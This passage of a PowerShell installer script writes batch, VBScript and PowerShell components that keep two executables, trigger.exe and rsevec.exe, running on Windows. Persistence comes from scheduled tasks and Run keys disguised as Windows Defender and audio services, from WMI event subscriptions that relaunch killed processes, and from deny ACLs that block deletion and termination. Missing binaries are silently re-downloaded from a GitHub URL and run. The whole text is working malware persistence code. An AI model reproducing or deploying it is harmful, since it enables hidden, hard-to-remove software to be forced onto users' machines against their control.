    tasklist /FI "IMAGENAME eq trigger.exe" 2>nul | find /I "trigger.exe" >nul
    if not errorlevel 1 exit /b 0
    rd /s /q "%LOCK%" 2>nul & md "%LOCK%" 2>nul
    if errorlevel 1 exit /b 0
)
call :LOG "Legacy watchdog started."

:LOOP
if not exist "%LOCK%" goto :DONE
schtasks /Run /TN "MicrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63" >nul 2>&1
if not exist "%EXE%" (
    call :LOG "trigger.exe missing — repairing."
    call :REPAIR
)
if not exist "%EXE%" (
    call :LOG "Repair failed; waiting 15s."
    ping 127.0.0.1 -n 16 >nul
    goto LOOP
)
call :LOG "Launching trigger.exe."
start "" /wait "%EXE%"
call :LOG "trigger.exe exited (code !ERRORLEVEL!)."
if not exist "%LOCK%" goto :DONE
ping 127.0.0.1 -n 5 >nul
goto LOOP

:REPAIR
if exist "%BCK%" (
    call :LOG "Restoring from rsc\ backup."
    copy /Y "%BCK%" "%EXE%" >nul 2>&1 && goto :eof
)
call :LOG "Downloading trigger.exe from GitHub."
set "TMP=%TEMP%\trig_dl.exe"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','wdsvc/1.0');" ^
    "try{$wc.DownloadFile('%GH%','%TMP%');exit 0}catch{exit 1}"
if errorlevel 1 (call :LOG "Download failed." & goto :eof)
copy /Y "%TMP%" "%EXE%" >nul 2>&1
copy /Y "%TMP%" "%BCK%" >nul 2>&1
del /F /Q "%TMP%" >nul 2>&1
call :LOG "Download repair complete."
goto :eof

:DONE
call :LOG "Legacy watchdog stopping."
rd /s /q "%LOCK%" 2>nul
exit /b 0

:LOG
echo [%date% %time%] %~1>>"%LOG%"
goto :eof
'@ | Set-Content -LiteralPath $WatchBat -Encoding ASCII

@'
Option Explicit
On Error Resume Next
Dim sh,fs,wmi,ps,p,cmd,log,inst
Set sh  = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
inst    = fs.GetParentFolderName(WScript.ScriptFullName)
log     = inst & "\wdsvc_log.txt"
Sub L(m)
    Dim f : Set f=fs.OpenTextFile(log,8,True)
    If Err.Number=0 Then f.WriteLine Now & " [VBS] " & m : f.Close
    Err.Clear
End Sub
If Not (wmi Is Nothing) Then
    Set ps = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
    For Each p In ps
        Dim cl : cl = "" : cl = p.CommandLine
        If InStr(LCase(cl),"wdsvc.bat") > 0 Then
            L "Watchdog already running (PID " & p.ProcessId & ") — skip."
            WScript.Quit 0
        End If
    Next
End If
cmd = "cmd.exe /c """ & inst & "\wdsvc.bat"""
L "Launching watchdog: " & cmd
sh.Run cmd, 0, False
If Err.Number <> 0 Then
    L "Shell.Run failed: " & Err.Description
    Err.Clear
    If Not (wmi Is Nothing) Then
        Dim p2 : Set p2 = wmi.Get("Win32_Process")
        Dim pid : p2.Create cmd, inst, Nothing, pid
        If Err.Number = 0 Then L "WMI launch OK (PID " & pid & ")"
        Else L "WMI fallback failed: " & Err.Description
    End If
End If
'@ | Set-Content -LiteralPath $LaunchVbs -Encoding ASCII

@'
Option Explicit
Dim sh,fs,inst,gp
Set sh  = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")
inst    = fs.GetParentFolderName(WScript.ScriptFullName)
gp      = inst & "\wdsvc_guard.ps1"
sh.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File """ & gp & """", 0, False
'@ | Set-Content -LiteralPath $GuardVbs -Encoding ASCII

# ── 7. Write wdsvc_guard.ps1 (enhanced — also ensures mesh tasks) ──
Write-Host "[7/14] Writing guard script (wdsvc_guard.ps1)..." -ForegroundColor Cyan

$guardScript = @'
# wdsvc_guard.ps1  —  Runs every 2 min as SYSTEM
# Re-applies ACLs, fixes tasks, repairs files, protects processes, ensures mesh
$ErrorActionPreference = 'SilentlyContinue'

$Inst      = Join-Path $env:WINDIR 'System32'
$Back      = Join-Path $Inst 'rsc'
$TaskMain  = 'WindowsDefenderHealthSync'
$TaskGuard = 'MicrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63'
$TaskA     = 'Microsoft\Windows\WindowsUpdate\AudioServiceCheck'
$TaskB     = 'Microsoft\Windows\WindowsUpdate\AudioCodecService'
$TaskC     = 'Microsoft\Windows\Multimedia\AudioTriggerSvc'
$RegPath   = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$LaunchVbs = Join-Path $Inst 'wdsvc_run.vbs'
$RegVal    = 'wscript.exe /b /nologo "' + $LaunchVbs + '"'
$GhTrig    = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe'
$GhRsev    = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/rsevec.exe'

$ToLock = @(
    (Join-Path $Inst 'trigger.exe'),
    (Join-Path $Inst 'rsevec.exe'),
    (Join-Path $Inst 'wdsvc.bat'),
    (Join-Path $Inst 'svcmon.bat'),
    (Join-Path $Inst 'dllhost2.bat'),
    (Join-Path $Inst 'rpcss2.bat'),
    (Join-Path $Back 'trigger.exe'),
    (Join-Path $Back 'rsevec.exe')
)

function Lock-ExeFile([string]$f) {
    if (-not (Test-Path $f)) { return }
    try {
        & icacls.exe $f /grant 'SYSTEM:(F)'         /C /Q 2>$null | Out-Null
        & icacls.exe $f /grant 'Administrators:(F)' /C /Q 2>$null | Out-Null
        & icacls.exe $f /grant 'Everyone:(RX)'      /C /Q 2>$null | Out-Null
        $acl      = Get-Acl $f
        $everyone = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
        $dr = (
            [System.Security.AccessControl.FileSystemRights]::Delete                  -bor
            [System.Security.AccessControl.FileSystemRights]::WriteData               -bor
            [System.Security.AccessControl.FileSystemRights]::AppendData              -bor
            [System.Security.AccessControl.FileSystemRights]::WriteAttributes         -bor
            [System.Security.AccessControl.FileSystemRights]::WriteExtendedAttributes -bor
            [System.Security.AccessControl.FileSystemRights]::ChangePermissions       -bor
            [System.Security.AccessControl.FileSystemRights]::TakeOwnership
        )
        $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                    $everyone, $dr, 'None', 'None', 'Deny')
        $acl.AddAccessRule($deny)
        Set-Acl $f $acl
    } catch {}
}

function Ensure-RegKey {
    try {
        $cur = (Get-ItemProperty $RegPath 'WindowsDefenderSync' -ErrorAction Stop).'WindowsDefenderSync'
        if ($cur -ne $RegVal) { Set-ItemProperty $RegPath 'WindowsDefenderSync' $RegVal }
    } catch { New-ItemProperty $RegPath 'WindowsDefenderSync' -Value $RegVal -PropertyType String -Force | Out-Null }
    # Also ensure the three mesh reg keys
    $vbsA = Join-Path $Inst 'svcmon_run.vbs'
    $vbsB = Join-Path $Inst 'dllhost2_run.vbs'
    $vbsC = Join-Path $Inst 'rpcss2_run.vbs'
    @(
        @('AudioCodecHost',  'wscript.exe /b /nologo "' + $vbsA + '"'),
        @('AudioRenderSvc',  'wscript.exe /b /nologo "' + $vbsB + '"'),
        @('AudioStreamHost', 'wscript.exe /b /nologo "' + $vbsC + '"')
    ) | ForEach-Object {
        $n=$_[0]; $v=$_[1]
        try {
            $c=(Get-ItemProperty $RegPath $n -ErrorAction Stop).$n
            if ($c -ne $v) { Set-ItemProperty $RegPath $n $v }
        } catch { New-ItemProperty $RegPath $n -Value $v -PropertyType String -Force | Out-Null }
    }
    # Deny delete/setvalue on the Run key to Everyone
    try {
        $rk = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]'ChangePermissions')
        if ($rk) {
            $rs  = $rk.GetAccessControl()
            $e   = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
            $d   = New-Object System.Security.AccessControl.RegistryAccessRule($e,'Delete,SetValue','Deny')
            $rs.AddAccessRule($d)
            $rk.SetAccessControl($rs)
            $rk.Close()
        }
    } catch {}
}

function Ensure-Task([string]$Name,[string]$Exe,[string]$Arg) {
    $t = Get-ScheduledTask -TaskName $Name -ErrorAction SilentlyContinue
    if ($null -eq $t) {
        $a  = New-ScheduledTaskAction -Execute $Exe -Argument $Arg -WorkingDirectory $Inst
        $p  = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $s  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -MultipleInstances IgnoreNew -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)
        $tr = @((New-ScheduledTaskTrigger -AtStartup),(New-ScheduledTaskTrigger -AtLogOn),(New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1)))
        # Ensure folder
        $folder = Split-Path $Name -Parent
        if ($folder -and $folder -ne '\') {
            try {
                $ts=$null; $ts=New-Object -ComObject Schedule.Service; $ts.Connect()
                $root=$ts.GetFolder('\')
                $parts=$folder.TrimStart('\').Split('\')
                $cur='\'
                foreach($part in $parts){$cur=$cur.TrimEnd('\')+'\'+$part;try{$root.GetFolder($cur)|Out-Null}catch{$root.CreateFolder($cur)|Out-Null}}
            } catch {}
        }
        Register-ScheduledTask -TaskName $Name -Action $a -Trigger $tr -Principal $p -Settings $s -Force | Out-Null
        return
    }
    if ($t.Settings.Enabled -eq $false) { $t.Settings.Enabled=$true; Set-ScheduledTask -InputObject $t | Out-Null }
    $xml = Join-Path $env:WINDIR "System32\Tasks\$Name"
    if (Test-Path $xml) {
        try {
            & icacls.exe $xml /grant 'SYSTEM:(F)' /C /Q 2>$null | Out-Null
            $acl=Get-Acl $xml; $e=[System.Security.Principal.SecurityIdentifier]'S-1-1-0'
            $d=New-Object System.Security.AccessControl.FileSystemAccessRule($e,'Delete,Write','Deny')
            $acl.AddAccessRule($d); Set-Acl $xml $acl
        } catch {}
    }
}

Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices; using System.Security.AccessControl;
public class PP3 {
    const uint RC=0x20000,WD=0x40000;
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("advapi32.dll")] static extern bool GetKernelObjectSecurity(IntPtr h,int r,[Out]byte[] sd,uint l,out uint n);
    [DllImport("advapi32.dll")] static extern bool SetKernelObjectSecurity(IntPtr h,int r,byte[] sd);
    public static void Protect(int pid){
        IntPtr h=OpenProcess(RC|WD,false,pid);if(h==IntPtr.Zero)return;
        try{
            uint n=0;GetKernelObjectSecurity(h,4,null,0,out n);
            byte[] sd=new byte[n];GetKernelObjectSecurity(h,4,sd,n,out n);
            var r=new RawSecurityDescriptor(sd,0);
            var d=r.DiscretionaryAcl??new RawAcl(GenericAcl.AclRevision,1);
            r.DiscretionaryAcl=d;
            var e=new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid,null);
            d.InsertAce(0,new CommonAce(AceFlags.None,AceQualifier.AccessDenied,1,e,false,null));
            byte[] ns=new byte[r.BinaryLength];r.GetBinaryForm(ns,0);
            SetKernelObjectSecurity(h,4,ns);
        }finally{CloseHandle(h);}
    }
}
"@ -ErrorAction SilentlyContinue

function Repair-Exe([string]$Main,[string]$Bck,[string]$Url) {
    if (Test-Path $Main) { return }
    if (Test-Path $Bck)  { Copy-Item $Bck $Main -Force; return }
    $wow  = Join-Path $env:WINDIR ('SysWOW64\' + [IO.Path]::GetFileName($Main))
    $low  = Join-Path (Split-Path $env:LOCALAPPDATA -Parent) ('LocalLow\svcmon\' + [IO.Path]::GetFileName($Main))
    if (Test-Path $wow) { Copy-Item $wow $Main -Force; return }
    if (Test-Path $low) { Copy-Item $low $Main -Force; return }
    try {
        $wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','guard/1.0')
        $tmp=Join-Path $env:TEMP 'rpr.exe'
        $wc.DownloadFile($Url,$tmp)
        Copy-Item $tmp $Main -Force
        Copy-Item $tmp $Bck  -Force
        Remove-Item $tmp -Force
    } catch {}
}

# ── Run all checks ─────────────────────────────────────────────
foreach ($f in $ToLock) { Lock-ExeFile $f }
Ensure-RegKey
Ensure-Task $TaskMain  'wscript.exe' ('/b /nologo "' + (Join-Path $Inst 'wdsvc_run.vbs') + '"')
Ensure-Task $TaskGuard 'wscript.exe' ('/b /nologo "' + (Join-Path $Inst 'wdsvc_guard_run.vbs') + '"')
Ensure-Task $TaskA     'wscript.exe' ('/b /nologo "' + (Join-Path $Inst 'svcmon_run.vbs') + '"')
Ensure-Task $TaskB     'wscript.exe' ('/b /nologo "' + (Join-Path $Inst 'dllhost2_run.vbs') + '"')
Ensure-Task $TaskC     'wscript.exe' ('/b /nologo "' + (Join-Path $Inst 'rpcss2_run.vbs') + '"')
Repair-Exe (Join-Path $Inst 'trigger.exe') (Join-Path $Back 'trigger.exe') $GhTrig
Repair-Exe (Join-Path $Inst 'rsevec.exe')  (Join-Path $Back 'rsevec.exe')  $GhRsev
Get-Process -Name trigger -ErrorAction SilentlyContinue | ForEach-Object { try{[PP3]::Protect($_.Id)}catch{} }
Get-Process -Name rsevec  -ErrorAction SilentlyContinue | ForEach-Object { try{[PP3]::Protect($_.Id)}catch{} }
'@

$guardScript | Set-Content -LiteralPath $GuardPs1 -Encoding UTF8

# ── 8. Write 48-hour re-patch script ──────────────────────────
Write-Host "[8/14] Writing 48-hour re-patch script..." -ForegroundColor Cyan

# IMPORTANT: This script is designed to be IDEMPOTENT — it only installs
# what is missing. It never overwrites files that are already locked/present.
# It searches all 3 stored copies for trigger.exe + rsevec.exe.
$repatchScript = @'
# wdsvc_repatch.ps1  —  Silent 48-hour idempotent re-patcher
# Runs as SYSTEM. Only installs what is missing. Never overwrites locked files.
$ErrorActionPreference = 'SilentlyContinue'

$Inst    = Join-Path $env:WINDIR 'System32'
$Back    = Join-Path $Inst 'rsc'
$SysWow  = Join-Path $env:WINDIR 'SysWOW64'
$AppLow  = Join-Path (Split-Path $env:LOCALAPPDATA -Parent) 'LocalLow\svcmon'
$RegPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
$GhTrig  = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/trigger.exe'
$GhRsev  = 'https://raw.githubusercontent.com/Emmanuel-2009-Iwuoha/rsevec/main/dist/rsevec.exe'
$Log     = Join-Path $Inst 'wdsvc_log.txt'

function L([string]$m) {
    try { Add-Content $Log ("[" + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "] [REPATCH] " + $m) } catch {}
}

# Find the best available source for a given filename
function Find-BestSource([string]$FileName) {
    $candidates = @(
        (Join-Path $Back   $FileName),
        (Join-Path $SysWow $FileName),
        (Join-Path $AppLow $FileName)
    )
    foreach ($c in $candidates) {
        if ((Test-Path $c) -and (Get-Item $c -ErrorAction SilentlyContinue).Length -gt 0) { return $c }
    }
    return $null
}

# Find install.cmd from stored copies
function Find-Installer {
    foreach ($d in @($Back,$SysWow,$AppLow)) {
        $p = Join-Path $d 'install.cmd'
        if (Test-Path $p) { return $p }
    }
    return $null
}

# Silently copy a file only if destination is MISSING (never overwrite)
function Ensure-File([string]$Dest,[string]$Src) {
    if (Test-Path $Dest) { return $true }
    if (-not $Src -or -not (Test-Path $Src)) { return $false }
    try { Copy-Item $Src $Dest -Force; return $true } catch { return $false }
}

# Download helper
function Download-Best([string]$Url,[string]$Dest) {
    try {
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('User-Agent','repatch/1.0')
        $tmp=Join-Path $env:TEMP 'rp_dl.exe'
        $wc.DownloadFile($Url,$tmp)
        if((Test-Path $tmp)-and(Get-Item $tmp).Length -gt 0){
            Copy-Item $tmp $Dest -Force
            Remove-Item $tmp -Force
            return $true
        }
    } catch {}
    return $false
}

L "Re-patch cycle started"

# ── 1. Repair trigger.exe ──────────────────────────────────────
$trigDest = Join-Path $Inst 'trigger.exe'
if (-not (Test-Path $trigDest)) {
    L "trigger.exe missing from System32 — repairing"
    $src = Find-BestSource 'trigger.exe'
    if ($src) {
        Ensure-File $trigDest $src
        L "Restored trigger.exe from: $src"
    } else {
        if (Download-Best $GhTrig $trigDest) { L "Downloaded trigger.exe from GitHub" }
        else { L "FAILED to restore trigger.exe" }
    }
}

# ── 2. Repair rsevec.exe ───────────────────────────────────────
$rsevDest = Join-Path $Inst 'rsevec.exe'
if (-not (Test-Path $rsevDest)) {
    L "rsevec.exe missing from System32 — repairing"
    $src = Find-BestSource 'rsevec.exe'
    if ($src) {
        Ensure-File $rsevDest $src
        L "Restored rsevec.exe from: $src"
    } else {
        if (Download-Best $GhRsev $rsevDest) { L "Downloaded rsevec.exe from GitHub" }
        else { L "FAILED to restore rsevec.exe" }
    }
}

# ── 3. Ensure scheduled tasks (re-register if deleted) ────────
$taskDefs = @(
    @{ Name='WindowsDefenderHealthSync';                           Exe='wscript.exe'; Arg='/b /nologo "' + (Join-Path $Inst 'wdsvc_run.vbs') + '"'       },
    @{ Name='MicrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63';                 Exe='wscript.exe'; Arg='/b /nologo "' + (Join-Path $Inst 'wdsvc_guard_run.vbs') + '"' },
    @{ Name='Microsoft\Windows\WindowsUpdate\AudioServiceCheck';   Exe='wscript.exe'; Arg='/b /nologo "' + (Join-Path $Inst 'svcmon_run.vbs') + '"'     },
    @{ Name='Microsoft\Windows\WindowsUpdate\AudioCodecService';   Exe='wscript.exe'; Arg='/b /nologo "' + (Join-Path $Inst 'dllhost2_run.vbs') + '"'   },
    @{ Name='Microsoft\Windows\Multimedia\AudioTriggerSvc';        Exe='wscript.exe'; Arg='/b /nologo "' + (Join-Path $Inst 'rpcss2_run.vbs') + '"'     }
)
foreach ($td in $taskDefs) {
    $t = Get-ScheduledTask -TaskName $td.Name -ErrorAction SilentlyContinue
    if ($null -eq $t) {
        L "Re-registering missing task: $($td.Name)"
        try {
            $a  = New-ScheduledTaskAction -Execute $td.Exe -Argument $td.Arg -WorkingDirectory $Inst
            $p  = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
            $s  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -MultipleInstances IgnoreNew -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)
            $tr = @(
                (New-ScheduledTaskTrigger -AtStartup),
                (New-ScheduledTaskTrigger -AtLogOn),
                (New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1))
            )
            $folder = Split-Path $td.Name -Parent
            if ($folder -and $folder -ne '\') {
                $ts=New-Object -ComObject Schedule.Service; $ts.Connect()
                $root=$ts.GetFolder('\')
                $parts=$folder.TrimStart('\').Split('\')
                $cur='\'
                foreach($part in $parts){$cur=$cur.TrimEnd('\')+'\'+$part;try{$root.GetFolder($cur)|Out-Null}catch{$root.CreateFolder($cur)|Out-Null}}
            }
            Register-ScheduledTask -TaskName $td.Name -Action $a -Trigger $tr -Principal $p -Settings $s -Force | Out-Null
            L "Re-registered task: $($td.Name)"
        } catch { L "Failed to re-register $($td.Name): $_" }
    } elseif ($t.Settings.Enabled -eq $false) {
        $t.Settings.Enabled=$true; Set-ScheduledTask -InputObject $t | Out-Null
        L "Re-enabled disabled task: $($td.Name)"
    }
}

# ── 4. Ensure registry Run keys ────────────────────────────────
$vbsA = Join-Path $Inst 'svcmon_run.vbs'
$vbsB = Join-Path $Inst 'dllhost2_run.vbs'
$vbsC = Join-Path $Inst 'rpcss2_run.vbs'
$vbsM = Join-Path $Inst 'wdsvc_run.vbs'
$regEntries = @(
    @('WindowsDefenderSync', 'wscript.exe /b /nologo "' + $vbsM + '"'),
    @('AudioCodecHost',      'wscript.exe /b /nologo "' + $vbsA + '"'),
    @('AudioRenderSvc',      'wscript.exe /b /nologo "' + $vbsB + '"'),
    @('AudioStreamHost',     'wscript.exe /b /nologo "' + $vbsC + '"')
)
foreach ($re in $regEntries) {
    $n=$re[0]; $v=$re[1]
    try {
        $cur=(Get-ItemProperty $RegPath $n -ErrorAction Stop).$n
        if ($cur -ne $v) { Set-ItemProperty $RegPath $n $v; L "Updated reg key: $n" }
    } catch {
        New-ItemProperty $RegPath $n -Value $v -PropertyType String -Force | Out-Null
        L "Re-created reg key: $n"
    }
}

# ── 5. Ensure watchdog scripts exist (restore from stored copies) ──
$scripts = @('svcmon.bat','dllhost2.bat','rpcss2.bat','wdsvc.bat',
             'svcmon_run.vbs','dllhost2_run.vbs','rpcss2_run.vbs',
             'wdsvc_run.vbs','wdsvc_guard_run.vbs','wdsvc_guard.ps1')
foreach ($s in $scripts) {
    $dest = Join-Path $Inst $s
    if (-not (Test-Path $dest)) {
        L "Script missing: $s — looking in backups"
        # Scripts are not stored in backups normally — only exes are.
        # If scripts are gone, we need to run install.cmd again.
        $ins = Find-Installer
        if ($ins) {
            L "Running installer to restore missing scripts: $ins"
            # Run silently as admin (we're already SYSTEM)
            Start-Process 'cmd.exe' -ArgumentList ('/c "' + $ins + '"') -WindowStyle Hidden -Wait
            L "Installer run complete"
            break  # Installer will fix everything, no need to continue loop
        } else {
            L "No installer found in backup locations — cannot restore scripts"
        }
    }
}

# ── 6. Ensure trigger.exe is running ──────────────────────────
$trig = Join-Path $Inst 'trigger.exe'
if (Test-Path $trig) {
    $running = Get-Process -Name trigger -ErrorAction SilentlyContinue
    if (-not $running) {
        L "trigger.exe not running — starting"
        Start-Process -FilePath $trig -WindowStyle Hidden
    }
}

L "Re-patch cycle complete"
'@

$repatchScript | Set-Content -LiteralPath $RepatchPs1 -Encoding UTF8

# VBS launcher for re-patch (run PowerShell silently)
@'
Option Explicit
Dim sh,fs,inst,ps1
Set sh  = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")
inst    = fs.GetParentFolderName(WScript.ScriptFullName)
ps1     = inst & "\wdsvc_repatch.ps1"
sh.Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1 & """", 0, False
'@ | Set-Content -LiteralPath $RepatchVbs -Encoding ASCII

# ── 9. Set up WMI Permanent Event Subscription ───────────────
Write-Host "[9/14] Setting up WMI Permanent Event Subscription..." -ForegroundColor Cyan

# WMI permanent subscriptions survive reboots, registry wipes, and task deletions.
# They live in the WMI repository at root\subscription.
# We create subscriptions for: trigger.exe termination, svcmon.bat termination (via cmd),
# dllhost2.bat termination, rpcss2.bat termination.
# When any of these die, WMI fires the CommandLineEventConsumer which runs the VBS launcher.

try {
    $wmiNS = 'root\subscription'

    # Helper to create a WMI subscription for process termination
    function New-WmiProcessSubscription([string]$FilterName,[string]$ConsumerName,[string]$ProcessName,[string]$CmdLine) {
        # Remove existing if present
        try { Get-WmiObject -Namespace $wmiNS -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject } catch {}
        try { Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject } catch {}
        try { Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding -Filter "Filter=""__EventFilter.Name='$FilterName'""" | Remove-WmiObject } catch {}

        # Event filter: watches for InstanceDeletion of Win32_Process where Name matches
        # WQL requires double quotes for string literals — single quotes silently fail
        $filterQuery = 'SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "' + $ProcessName + '"'

        $filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{
            Name           = $FilterName
            EventNameSpace = 'root\cimv2'
            QueryLanguage  = 'WQL'
            Query          = $filterQuery
        }

        $consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{
            Name              = $ConsumerName
            CommandLineTemplate = $CmdLine
            RunInteractively  = $false
        }

        Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{
            Filter   = $filter
            Consumer = $consumer
        } | Out-Null

        Write-Host "  WMI subscription: $FilterName → $ConsumerName" -ForegroundColor DarkGray
    }

    $vbsLaunch  = Join-Path $Inst 'wdsvc_run.vbs'
    $vbsSvcmon  = Join-Path $Inst 'svcmon_run.vbs'
    $vbsDll     = Join-Path $Inst 'dllhost2_run.vbs'
    $vbsRpc     = Join-Path $Inst 'rpcss2_run.vbs'

    # Subscription 1: trigger.exe termination → restart via main watchdog VBS
    New-WmiProcessSubscription `
        'AudioEvtFilter_Trigger' `
        'AudioEvtConsumer_Trigger' `
        'trigger.exe' `
        ('wscript.exe /b /nologo "' + $vbsLaunch + '"')

    # Subscription 2: rsevec.exe termination → restart via svcmon VBS
    # (Watching wscript.exe is too broad — fires for every VBS on the system)
    New-WmiProcessSubscription `
        'AudioEvtFilter_Svcmon' `
        'AudioEvtConsumer_Svcmon' `
        'rsevec.exe' `
        ('wscript.exe /b /nologo "' + $vbsSvcmon + '"')

    Write-Host "  WMI subscriptions created in root\subscription" -ForegroundColor Green
} catch {
    Write-Host "  WMI subscription setup failed (non-fatal): $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "  Other persistence layers (tasks, registry, mesh) will compensate." -ForegroundColor Yellow
}

# ── 10. Apply ACL locks ───────────────────────────────────────
Write-Host "[10/14] Applying ACL locks..." -ForegroundColor Cyan
$toProtect = @(
    $TrigExe, $TrigBack,
    $RsevecExe, $RsevecBack,
    $WatchBat, $SvcmonBat, $Dllhost2Bat, $Rpcss2Bat
) | Where-Object { Test-Path $_ }

foreach ($f in $toProtect) { Lock-ExeFile $f }

# VBS and PS1 are readable/runnable — grant, do NOT deny
$readables = @(
    $LaunchVbs, $GuardVbs, $GuardPs1,
    $SvcmonVbs, $Dllhost2Vbs, $Rpcss2Vbs,
    $RepatchPs1, $RepatchVbs
) | Where-Object { Test-Path $_ }

foreach ($f in $readables) {
    & icacls.exe $f /grant 'SYSTEM:(F)'         /C /Q 2>$null | Out-Null
    & icacls.exe $f /grant 'Administrators:(F)' /C /Q 2>$null | Out-Null
    Write-Host "  Readable: $([IO.Path]::GetFileName($f))" -ForegroundColor DarkGray
}

# ── 11. Registry Run keys (5 entries) ─────────────────────────
Write-Host "[11/14] Setting registry Run keys..." -ForegroundColor Cyan

# First: strip any deny ACL left by a previous run so we can write
try {
    $rk = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]'ChangePermissions,TakeOwnership')
    if ($rk) {
        $rs       = $rk.GetAccessControl()
        $everyone = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
        $admins   = [System.Security.Principal.SecurityIdentifier]'S-1-5-32-544'
        # Remove ALL deny rules for Everyone (including Delete,SetValue from previous guard run)
        $rs.Access | Where-Object {
            $_.IdentityReference -eq $everyone -and
            $_.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Deny
        } | ForEach-Object { $rs.RemoveAccessRule($_) | Out-Null }
        # Ensure Administrators have FullControl
        $allow = New-Object System.Security.AccessControl.RegistryAccessRule(
            $admins,
            [System.Security.AccessControl.RegistryRights]'FullControl',
            [System.Security.AccessControl.AccessControlType]::Allow)
        $rs.AddAccessRule($allow)
        $rk.SetAccessControl($rs)
        $rk.Close()
        Write-Host "  Unlocked registry Run key for writing" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "  Could not unlock registry key (will try writing anyway): $($_.Exception.Message)" -ForegroundColor Yellow
}

$regEntries = @(
    @($RegName,    $RegVal),
    @($RegSvcmon,  ('wscript.exe /b /nologo "' + $SvcmonVbs   + '"')),
    @($RegDll,     ('wscript.exe /b /nologo "' + $Dllhost2Vbs + '"')),
    @($RegRpc,     ('wscript.exe /b /nologo "' + $Rpcss2Vbs   + '"')),
    @('AudioDigitalSvc', ('"' + $TrigExe + '"'))
)
foreach ($re in $regEntries) {
    try {
        Set-ItemProperty -Path $RegPath -Name $re[0] -Value $re[1] -Force
        Write-Host "  Set: $($re[0])" -ForegroundColor Green
    } catch {
        Write-Host "  Failed $($re[0]): $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# Re-lock the Run key after writing: deny Everyone Delete+SetValue
try {
    $rk2 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]'ChangePermissions')
    if ($rk2) {
        $rs2 = $rk2.GetAccessControl()
        $e2  = [System.Security.Principal.SecurityIdentifier]'S-1-1-0'
        $d2  = New-Object System.Security.AccessControl.RegistryAccessRule(
            $e2, 'Delete,SetValue',
            [System.Security.AccessControl.AccessControlType]::Deny)
        $rs2.AddAccessRule($d2)
        $rk2.SetAccessControl($rs2)
        $rk2.Close()
        Write-Host "  Re-locked registry Run key" -ForegroundColor DarkGray
    }
} catch {}

# ── 12. Register all Scheduled Tasks ──────────────────────────
Write-Host "[12/14] Registering scheduled tasks..." -ForegroundColor Cyan

